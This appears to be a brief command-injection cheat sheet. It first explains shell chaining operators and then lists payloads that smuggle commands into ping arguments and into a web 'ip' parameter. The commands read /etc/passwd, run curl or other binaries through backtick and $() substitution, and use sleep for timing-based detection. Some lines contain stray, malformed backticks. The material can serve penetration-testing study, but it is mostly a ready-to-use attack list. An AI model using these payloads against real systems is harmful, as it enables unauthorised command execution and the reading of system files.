```
command1 && command2 that will run command2 if command1 succeeds.
command1 || command2 that will run command2 if command1 fails.
command1 ; command2 that will run command1 then command2.
command1 | command2 that will run command1 and send the output of command1 to command2
```

Exploitation
```
ping 127.0.0.1; cat /etc/passwd
```

2. Inject With Ping over a browser

```
ping -c 2 "127.0.0.1`cat /etc/passwd`"
ping -c 2 `uname`
ping -c 2 $(/usr/local/bin/script value)
ping -c 2 "127.0.0.1$(curl url)"
ping -c 2 "127.0.0.1$(ping ip)`"
ping -c 2 "127.0.0.1$(sleep 20)`" # Time based comparison to find out if command executes
```

curl http://url/?ip=127.0.0.1
curl http://url/\?ip\=`8.8.8.8$(/usr/local/bin/score uuid)`
